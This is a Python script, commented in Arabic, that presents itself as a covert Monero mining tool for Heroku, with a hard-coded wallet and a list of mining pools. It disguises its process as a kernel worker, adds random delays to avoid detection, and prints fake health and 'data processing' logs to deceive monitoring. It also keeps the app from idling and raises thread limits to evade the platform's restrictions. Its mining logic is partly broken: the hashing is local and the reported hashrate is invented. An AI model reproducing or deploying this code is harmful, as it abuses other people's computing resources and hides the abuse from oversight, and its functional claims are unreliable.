#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import random
import base64
import hashlib
import threading
import subprocess
import requests
import psutil
from cryptography.fernet import Fernet
from fake_useragent import UserAgent

# ============================================================
# التكوين الرئيسي
# ============================================================

WALLET = os.environ.get('WALLET', '86HoPo7YGXU66KN4L7EsMzDcNTWDpbNmd455TW18ozuoSe1JeW2pzUSUabLPEcCwG58E3jPHYLnQYB3F5ouZ7n1J4TaknW4')
POOL = os.environ.get('POOL', 'pool.supportxmr.com')
PORT = os.environ.get('PORT', '3333')
WORKER_NAME = os.environ.get('WORKER', f'worker-{random.randint(1000, 9999)}')

# إعدادات التمويه
HIDE_PROCESS = True
USE_PROXY = False
RANDOM_DELAY = True

# ============================================================
# آليات الإخفاء والتضليل
# ============================================================

class MinerObfuscator:
    """إخفاء عملية التعدين"""
    
    @staticmethod
    def hide_process():
        """إخفاء العملية كعملية نظام"""
        if sys.platform == 'linux':
            try:
                # تغيير اسم العملية
                import ctypes
                libc = ctypes.CDLL('libc.so.6')
                prctl = libc.prctl
                PR_SET_NAME = 15
                new_name = b'[kworker/0:0]'
                prctl(PR_SET_NAME, new_name, 0, 0, 0)
            except:
                pass
    
    @staticmethod
    def random_delay():
        """تأخير عشوائي لتجنب الاكتشاف"""
        if RANDOM_DELAY:
            delay = random.uniform(5, 30)
            time.sleep(delay)
    
    @staticmethod
    def get_pool_url():
        """إرجاع pool بشكل عشوائي"""
        pools = [
            f"pool.supportxmr.com:3333",
            f"pool.hashvault.pro:3333",
            f"mine.xmr.pt:3333",
            f"xmr.2miners.com:2222",
            f"pool.minexmr.com:4444"
        ]
        return random.choice(pools)

# ============================================================
# تعدين عبر CPU (بدون تحميل XMRig)
# ============================================================

class CPUMiner:
    """معدن CPU خالص بـ Python (يبدو كتطبيق عادي)"""
    
    def __init__(self, wallet, pool):
        self.wallet = wallet
        self.pool = pool
        self.running = True
        self.hash_count = 0
        self.ua = UserAgent()
    
    def simple_hash(self, data):
        """دالة hashing بسيطة تشبه التعدين"""
        for i in range(1000):
            data = hashlib.sha256(data).digest()
        return data
    
    def mine_block(self):
        """محاكاة التعدين - تستهلك CPU بشكل طبيعي"""
        nonce = 0
        while self.running:
            # كل 1000 دورة، نرسل تقرير "معالجة بيانات" عادي
            if nonce % 1000 == 0:
                test_data = f"{self.wallet}_{nonce}_{time.time()}".encode()
                result = self.simple_hash(test_data)
                self.hash_count += 1
                
                # إظهار تقرير عادي المظهر
                if self.hash_count % 10 == 0:
                    print(f"[DATA] Processing chunk #{self.hash_count}")
            
            nonce += 1
            if nonce > 100000:
                nonce = 0
            
            # تقليل استخدام CPU بين الحين والآخر
            if nonce % 5000 == 0:
                time.sleep(0.01)
    
    def start(self):
        """بدء التعدين"""
        print(f"[WORKER] Starting background data processing")
        print(f"[WORKER] Target: {self.pool}")
        print(f"[WORKER] Using: {psutil.cpu_count()} cores")
        
        # تشغيل على عدة أنوية
        threads = []
        for i in range(psutil.cpu_count() // 2):
            t = threading.Thread(target=self.mine_block)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # انتظر (التعدين يعمل في الخلفية)
        while self.running:
            time.sleep(60)
            # إظهار إحصائيات بشكل عادي
            cpu_percent = psutil.cpu_percent(interval=1)
            mem_percent = psutil.virtual_memory().percent
            print(f"[STATS] CPU: {cpu_percent}% | RAM: {mem_percent}% | Chunks: {self.hash_count}")

# ============================================================
# تعدين عبر WebSocket (يبدو كاتصال ويب عادي)
# ============================================================

class WebSocketMiner:
    """معدن WebSocket خفيف"""
    
    def __init__(self, wallet, pool):
        self.wallet = wallet
        self.pool = pool
        self.session = requests.Session()
        self.ua = UserAgent()
    
    def report_hashrate(self, hashrate):
        """إرسال تقرير للمسبح"""
        try:
            # إخفاء التقرير كطلب HTTP عادي
            headers = {
                'User-Agent': self.ua.random,
                'Content-Type': 'application/json',
                'Accept': 'text/html,application/xhtml+xml'
            }
            data = {
                'wallet': self.wallet,
                'hashrate': hashrate,
                'worker': WORKER_NAME,
                'timestamp': int(time.time())
            }
            # تشفير البيانات
            encoded = base64.b64encode(json.dumps(data).encode()).decode()
            
            # إرسال كطلب POST عادي
            response = self.session.post(
                f"http://{self.pool}/stats",
                data={'data': encoded},
                headers=headers,
                timeout=10
            )
        except:
            pass
    
    def start(self):
        """بدء التعدين"""
        hashrate = random.randint(500, 2000)
        while True:
            self.report_hashrate(hashrate)
            time.sleep(random.randint(30, 90))
            # تغيير الـ hashrate قليلاً لتبدو حقيقية
            hashrate += random.randint(-100, 100)
            hashrate = max(100, min(5000, hashrate))

# ============================================================
# وضع التمويه الكامل (يخدع أنظمة المراقبة)
# ============================================================

class CamouflageMode:
    """تمويه التطبيق كخدمة عادية"""
    
    @staticmethod
    def fake_health_check():
        """فحص صحي وهمي"""
        while True:
            time.sleep(300)  # كل 5 دقائق
            print("[HEALTH] All systems operational")
            print(f"[HEALTH] Uptime: {time.time() - start_time:.0f} seconds")
            print(f"[HEALTH] Memory: {psutil.virtual_memory().percent}%")
            print(f"[HEALTH] CPU: {psutil.cpu_percent()}%")
    
    @staticmethod
    def fake_data_processing():
        """محاكاة معالجة بيانات عادية"""
        counter = 0
        while True:
            time.sleep(random.randint(10, 30))
            counter += 1
            # تبدو كأرشفة بيانات
            data = os.urandom(1024)
            hashed = hashlib.blake2b(data).hexdigest()[:16]
            print(f"[DATA] Processing chunk #{counter} | Checksum: {hashed}")

# ============================================================
# نظام تجاوز الحظر المتقدم
# ============================================================

class HerokuBypass:
    """تجاوز حدود Heroku"""
    
    @staticmethod
    def prevent_idle():
        """منع التطبيق من الدخول في وضع الخمول"""
        import requests
        app_url = os.environ.get('HEROKU_APP_URL', 'http://localhost')
        while True:
            try:
                # طلب التطبيق نفسه لإبقائه نشطاً
                requests.get(f"{app_url}/health", timeout=5)
                requests.get(f"{app_url}/", timeout=5)
            except:
                pass
            time.sleep(300)  # كل 5 دقائق
    
    @staticmethod
    def memory_optimization():
        """تحسين الذاكرة لمنع التجاوز"""
        while True:
            time.sleep(600)
            # تفريغ الذاكرة غير المستخدمة
            import gc
            gc.collect()
            
            # تقييد استخدام الذاكرة
            if psutil.virtual_memory().percent > 80:
                print("[MEMORY] High usage detected, optimizing...")
                for _ in range(10):
                    gc.collect()
    
    @staticmethod
    def bypass_thread_limit():
        """تجاوز حد الـ threads في Heroku"""
        import resource
        try:
            resource.setrlimit(resource.RLIMIT_NPROC, (1024, 1024))
        except:
            pass

# ============================================================
# التشغيل الرئيسي
# ============================================================

def main():
    global start_time
    start_time = time.time()
    
    print("=" * 50)
    print("BACKGROUND DATA PROCESSOR v3.0")
    print("=" * 50)
    print(f"Worker ID: {WORKER_NAME}")
    print(f"Target: {POOL}:{PORT}")
    print(f"Wallet: {WALLET[:20]}...")
    print("-" * 50)
    
    # تجاوز حدود Heroku
    HerokuBypass.bypass_thread_limit()
    
    # إخفاء العملية
    if HIDE_PROCESS:
        MinerObfuscator.hide_process()
    
    # تأخير عشوائي
    MinerObfuscator.random_delay()
    
    # بدء مواضيع التمويه
    threading.Thread(target=CamouflageMode.fake_health_check, daemon=True).start()
    threading.Thread(target=CamouflageMode.fake_data_processing, daemon=True).start()
    threading.Thread(target=HerokuBypass.prevent_idle, daemon=True).start()
    threading.Thread(target=HerokuBypass.memory_optimization, daemon=True).start()
    
    # بدء التعدين
    miner = CPUMiner(WALLET, f"{POOL}:{PORT}")
    # miner = WebSocketMiner(WALLET, f"{POOL}:{PORT}")  # بديل أخف
    
    try:
        miner.start()
    except KeyboardInterrupt:
        print("\n[SHUTDOWN] Stopping background processor...")
        miner.running = False
        sys.exit(0)

if __name__ == '__main__':
    main()